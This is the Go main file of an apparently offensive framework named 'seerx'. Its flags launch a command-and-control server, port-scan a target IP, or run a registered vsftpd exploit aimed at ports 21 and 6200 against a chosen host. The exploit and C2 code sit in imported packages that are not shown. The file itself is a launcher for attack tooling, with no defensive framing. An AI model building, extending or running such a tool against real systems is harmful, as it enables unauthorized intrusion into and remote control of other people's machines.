package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/flaskbush/seerx/c2/server"
	"github.com/flaskbush/seerx/exploits"
	"github.com/flaskbush/seerx/exploits/vsftpd"
	"github.com/flaskbush/seerx/recon"
)

func main() {
	// Command line flags
	target := flag.String("target", "192.168.88.112", "Target IP")
	exploitName := flag.String("exploit", "", "Exploit name")
	scan := flag.Bool("scan", false, "Perform port scanning")
	portRange := flag.String("ports", "1-1000", "Port range to scan (e.g., 1-1000)")

	// Server flags
	serverMode := flag.Bool("server", false, "Run in C2 server mode")
	serverAddr := flag.String("addr", ":8080", "C2 server address host:port")
	dbPath := flag.String("db", "seerx.db", "Path to the SQL database file")

	flag.Parse()

	// Handle server mode
	if *serverMode {
		srv, err := server.NewServer(*dbPath)
		if err != nil {
			log.Printf("Error starting server: %v\n", err)
			return
		}

		log.Printf("Starting C2 server mode on %s...", *serverAddr)
		if err := srv.Start(*serverAddr); err != nil {
			log.Printf("Server error: %v\n", err)
		}
		return
	}

	// Handle port scanning
	if *scan {
		scanner := recon.NewPortScanner()
		fmt.Printf("Scanning ports %s on %s...\n", *portRange, *target)
		openPorts, err := scanner.Scan(*target, *portRange)
		if err != nil {
			fmt.Printf("Scanning error: %v\n", err)
			return
		}
		fmt.Println("Open ports:")
		for _, port := range openPorts {
			fmt.Println(port)
		}
		return
	}

	// Handle exploit execution
	if *exploitName != "" {
		manager := exploits.NewExploitManager()
		// Register available exploits
		vsftpdExploit := vsftpd.NewVsftpdExploit("21", "6200")
		manager.Register(vsftpdExploit)
		fmt.Printf("Running exploit %s against %s...\n", *exploitName, *target)
		err := manager.RunExploit(*exploitName, *target)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}
		return
	}

	// If no mode specified
	fmt.Println("Please specify either -scan or -exploit")
	flag.Usage()
}
